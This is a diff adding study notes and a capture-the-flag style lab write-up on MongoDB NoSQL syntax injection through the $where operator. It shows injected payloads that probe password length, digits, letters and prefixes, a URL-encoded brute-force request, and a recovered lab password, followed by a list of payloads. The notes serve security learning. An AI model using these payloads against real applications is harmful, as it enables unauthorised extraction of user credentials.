@@ -106,6 +106,32 @@ To target an account, you can construct a payload that includes a known username
 
 
 
+Exploiting syntax injection to extract data
+-------------------------------------------
+
+In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.
+
+### Exfiltrating data in MongoDB
+
+Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:
+
+`https://insecure-website.com/user/lookup?username=admin`
+
+This results in the following NoSQL query of the `users` collection:
+
+`{"$where":"this.username == 'admin'"}`
+
+As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:
+
+`admin' && this.password[0] == 'a' || 'a'=='b`
+
+This returns the first character of the user's password string, enabling you to extract the password character by character.
+
+You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:
+
+`admin' && this.password.match(/\d/) || 'a'=='b`
+
+
 
 
 
@@ -228,6 +254,162 @@ https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?categor
 
 
 
+<details>
+  <summary>Lab: Exploiting NoSQL injection to extract data</summary>
+
+1. first in my profile notice the role **`user want to see the sourse code`**
+
+
+```js
+const appendFromUser = (user) => {
+    const email = user.email;
+    if (email) {
+        document.querySelector("#user-details #user-email").textContent = email;
+    }
+
+    const role = user.role;
+    if (role) {
+        document.querySelector("#user-details #username").textContent += ` (role: ${role})`;
+    }
+};
+
+const appendUserDetails = () => {
+    const url = new URL(location);
+
+    fetch(`//${url.host}/user/lookup?user=${encodeURIComponent(url.searchParams.get('id'))}`)
+        .then(res => res.json())
+        .then(appendFromUser);
+};
+
+appendUserDetails();
+
+```
+
+2. so this endpoint i can check the role of user
+
+```
+/user/lookup?user=
+```
+
+<img width="1007" height="298" alt="image" src="https://github.com/user-attachments/assets/c384836c-84b0-4399-9899-77012949f3e3" />
+
+<img width="1027" height="326" alt="image" src="https://github.com/user-attachments/assets/65bbed68-7ae1-40c6-b006-10df06df5bb4" />
+
+3. Query that server send is :
+
+```js
+{ "$where": "this.username == 'admin'" }
+```
+
+ > test for **`nosql`**
+
+<img width="1356" height="361" alt="image" src="https://github.com/user-attachments/assets/3e619d7f-eeb7-47c3-aa0b-001608a3ae03" />
+
+
+
+4. we can inject it with
+
+```js
+administrator' && this.password[0] == 'a' || 'a'=='b
+```
+
+> **`the query after inject`**
+
+```js
+this.username == 'administrator' && this.password[0] == 'a' || 'a'=='b'
+```
+
+## > first lets get password length
+
+```js
+administrator' && this.password.length == 8 || 'x'=='y
+```
+
+<img width="1382" height="703" alt="image" src="https://github.com/user-attachments/assets/68b8d8ff-2f4a-40c7-98c1-d93c3d2dba78" />
+
+
+
+> 2. found if there is digit in it
+
+```js
+administrator' && this.password.match(/\d/) || 'a'=='b
+```
+
+<img width="1308" height="364" alt="image" src="https://github.com/user-attachments/assets/f3d9e6bb-9fe5-451d-b771-85ae56232695" />
+
+
+> 3. now brute force
+
+<img width="1622" height="598" alt="image" src="https://github.com/user-attachments/assets/586edd18-a6a6-4772-9ff5-8cf742b7714a" />
+
+```
+/user/lookup?user=administrator'+%26%26+this.password[0]+%3d%3d+'u'+||+'a'%3d%3d'b
+```
+
+### **`password`**
+
+```
+ugemsykg
+```
+
+
+<img width="1312" height="652" alt="image" src="https://github.com/user-attachments/assets/fa31a2f5-6157-473b-853f-2c9f1b1f925b" />
+
+  
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+```json
+administrator' && '1'=='1
+administrator' && '1'=='2
+```
+
+
+```json
+administrator' && this.password.length == 1 || 'a'=='b
+```
+
+```json
+administrator' && this.password.match(/\d/) || 'a'=='b
+administrator' && this.password.match(/[A-Z]/) || 'a'=='b
+administrator' && this.password.match(/[a-z]/) || 'a'=='b
+```
+
+
+
+```json
+administrator' && this.password[0] == 'a' || 'a'=='b
+```
+
+```json
+administrator' && /^a.*/.test(this.password) || 'a'=='b
+administrator' && /^ab.*/.test(this.password) || 'a'=='b
+
+```
 
 
 
